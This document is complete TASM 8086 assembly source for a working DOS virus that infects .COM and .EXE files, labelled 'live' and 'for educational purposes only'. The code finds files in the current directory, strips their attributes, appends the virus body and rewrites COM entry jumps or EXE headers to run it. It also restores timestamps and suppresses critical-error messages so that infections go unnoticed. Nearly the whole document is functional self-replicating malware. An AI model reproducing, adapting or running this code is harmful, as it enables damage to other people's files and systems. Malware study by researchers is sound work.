;This file is a direct action .COM/.EXE file infector written
;in TASM compatible 8086 assembly. This is a live virus
;for educational purposes only. Please do not release it. Execute
;only on an isolated machine under controlled conditions.

;This virus also needs a four-byte stub to be attached to it after
;compilation. NOP's will work fine.

;One interesting characteristic of this virus is that if it is on
;an EXE file, it will infect .COM files, but if it is on a COM
;file, it will only search for EXE's. It will infect each
;uninfected file of whichever type chosen in the current directory
;on runtime.

.model tiny
.radix 16
.code
org 100
start:
COM_ENTRY:
call get_offset

lea si,[bp+storage_bytes] ;Restore original bytes to
mov di,100 ;host.
movsw
movsw

mov byte ptr [COM_EXE+bp],0 ;Remember host is COM file.
jmp short Main_Virus ;Go to main virus.

Enter_EXE:
push es ;Save current ES (and DS) registers
push cs cs
pop es ds ;Set ES = DS = CS

call get_offset
lea si,[Old_IP+bp]
lea di,[Save_IP+bp] ;Setup old variables for infection
movsw
movsw
movsw
movsw

mov byte ptr [COM_EXE+bp],1 ;Remember host is EXE file.
Main_Virus:
call Set_Handler

lea dx,[DTA+bp] ;Set DTA to new address
call Set_DTA

cmp byte ptr [COM_EXE+bp],1 ;If virus is on an .EXE,
jne Find_EXE ;infect COM files and
;vice-versa
Find_COM:
lea dx,[Com_mask+bp] ;Find a .COM file
jmp Find_First
Find_Exe:
lea dx,[Exe_mask+bp]
Find_First:
mov ah,4e
xor cx,cx
Find_File:
int 21
jc Outa_Files

xor ah,ah ;Get attributes into CX
lea dx,[DTA+1e+bp]
call do_attribs

mov word ptr [bp+attribs],cx ;Save attribs
xor cx,cx
mov al,1
call do_attribs ;Set attribs to normal

mov ax,3d02 ;Open file read/write
lea dx,[bp+DTA+1e]
int 21
jc Outa_Files

xchg bx,ax

mov al,0 ;Get and save time stamp
call Do_Time
mov word ptr [bp+Time],cx
mov word ptr [bp+Date],dx

mov ah,3f
mov cx,1a ;Read beginning of file
lea dx,[exe_header+bp] ;(header if .EXE)
int 21
jc Close_UP

call Check_Infected ;Is it infected?
jc Close_Up

cmp word ptr [exe_header+bp],'ZM' ;Is EXE?
je Infect_EXE ;go Infect EXE
cmp word ptr [exe_header+bp],'MZ'
je Infect_EXE

Infect_Com:
call Do_Com ;Infect COM file
jmp short Close_Up

Infect_Exe:
call Do_Exe ;Infect EXE

Close_Up:
mov al,01 ;Reset time stamp
mov cx,word ptr [bp+Time]
mov dx,word ptr [bp+Date]
call Do_Time

mov ah,3e ;Close file
int 21

mov al,01 ;Reset Attributes
mov cx,word ptr [bp+attribs]
lea dx,[DTA+1e+bp]
call Do_Attribs

mov ah,4f ;Find another file to infect...
jmp Find_File

Outa_Files:
call Reset_Handler ;Chose appropriate restore
cmp byte ptr [COM_EXE+bp],1 ;algorithm
je Restore_EXE

Restore_COM:
mov dx,80
call Set_DTA ;Reset DTA
mov di,100 ;jump 100
push di
ret

Restore_EXE:
pop es ;Restore seg registers
push es
pop ds

mov dx,80 ;Reset DTA
call Set_DTA

mov ax,es
add ax,10
add word ptr cs:[Save_CS+bp],ax
add ax,word ptr cs:[Save_SS+bp] ;Set SS:SP
;and go CS:IP
cli
mov ss,ax
mov sp,word ptr cs:[Save_SP+bp]
sti

db 0ea ;Far jump to CS:IP
Save_IP dw 0
Save_CS dw 0
Save_SS dw 0
Save_SP dw 0

Old_IP dw 0
Old_CS dw 0fff0
Old_SS dw 0fff0
Old_SP dw 0

Set_DTA:
mov ah,1a
int 21
ret

Do_attribs: ;Performs file attribute functions
mov ah,43
int 21
ret
Do_Time: ;Performs time stamp functions
mov ah,57
int 21
ret

Get_offset: ;Get diplacement of virus into BP
call next
next:
pop bp
sub bp,offset next
ret
Do_COM: ;Infect COM file
lea si,[exe_header+bp]
lea di,[storage_bytes+bp]
movsw
movsw

call Go_EOF

sub ax,3
mov word ptr [jump_bytes+1+bp],ax

call write_virus
call Go_BOF

mov ah,40
lea dx,[jump_bytes+bp] ;write in jump
mov cx,4
int 21
ret

Do_EXE:
call Save_Old_Header
call Go_EOF

push ax dx
call calculate_CSIP
pop dx ax

call calculate_size
call write_virus
call Go_BOF

mov ah,40
mov cx,1a
lea dx,[exe_header+bp] ;Write header
int 21
ret

Go_EOF: ;Go to end of file
mov ax,4202
jmp Move_FP
Go_BOF: ;Go to beginning of file
mov ax,4200
Move_FP:
xor cx,cx
xor dx,dx
int 21
ret

Write_Virus:
mov ah,40
mov cx,end_prog-start ;Append virus to file
lea dx,[bp+start]
int 21
ret

Save_Old_Header:
mov ax,word ptr [exe_header+bp+0e] ;Save old SS
mov word ptr [Old_SS+bp],ax
mov ax,word ptr [exe_header+bp+10] ;Save old SP
mov word ptr [Old_SP+bp],ax
mov ax,word ptr [exe_header+bp+14] ;Save old IP
mov word ptr [Old_IP+bp],ax
mov ax,word ptr [exe_header+bp+16] ;Save old CS
mov word ptr [Old_CS+bp],ax
ret

calculate_CSIP:
push ax
mov ax,word ptr [exe_header+bp+8] ;Get header length
mov cl,4 ;and convert it to
shl ax,cl ;bytes.
mov cx,ax
pop ax
sub ax,cx ;Subtract header
sbb dx,0 ;size from file
;size for memory
;adjustments
mov cl,0c ;Convert DX into
shl dx,cl ;segment Address
mov cl,4
push ax ;Change offset (AX) into
shr ax,cl ;segment, except for last
add dx,ax ;digit. Add to DX and
shl ax,cl ;save DX as new CS, put
pop cx ;left over into CX and
sub cx,ax ;store as the new IP.

add cx,Enter_EXE-start ;Adjust to go to EXE_Entry

mov word ptr [exe_header+bp+14],cx
mov word ptr [exe_header+bp+16],dx ;Set new CS:IP
mov word ptr [exe_header+bp+0e],dx ;Set new SS = CS
mov word ptr [exe_header+bp+10],0fffe ;Set new SP
mov byte ptr [exe_header+bp+12],'V' ;mark infection
ret

calculate_size:
push ax ;Save offset for later

add ax,end_prog-start ;Add virus size to DX:AX
adc dx,0

mov cl,7
shl dx,cl ;convert DX to pages
mov cl,9
shr ax,cl
add ax,dx
inc ax
mov word ptr [exe_header+bp+04],ax ;save # of pages

pop ax ;Get offset
mov dx,ax
shr ax,cl ;Calc remainder
shl ax,cl ;in last page
sub dx,ax
mov word ptr [exe_header+bp+02],dx ;save remainder
ret

Set_Handler:
mov ax,3524 ;Get Int 24 address
int 21 ;(Critical Error)
mov word ptr [IP_24+bp],bx
mov word ptr [CS_24+bp],es

mov ax,2524 ;Set Int 24
lea dx,[Int_24+bp]
int 21

push ds ;Restore ES
pop es
ret

Reset_Handler:
mov dx,word ptr cs:[CS_24+bp]
mov ds,dx
mov dx, word ptr cs:[IP_24+bp]
mov ax,2524 ;Reset handler to old one
int 21

push es ;restore DS.
pop ds
ret

Int_24: ;Return error code in al without
mov al,3 ;printing annoying message
iret

Check_Infected:
cmp byte ptr [exe_header+bp+3],'V' ;check .COM infected
je Is_Infected
cmp byte ptr [exe_header+bp+12],'V' ;check .EXE
je Is_Infected ;infected
clc
ret
Is_Infected:
stc
ret

Exe_mask db '*.EXE',0
Com_mask db '*.COM',0

jump_bytes db 0e9,0,0,'V' ;jump for COM's with ID

storage_bytes: ;Initial storage bytes
nop
nop
int 20

COM_EXE db 0 ;0 = COM, 1 = EXE
end_prog:
Time dw ?
Date dw ?
attribs dw ?
IP_24 dw ?
CS_24 dw ?
exe_header db 1a dup(?)
DTA:
end start
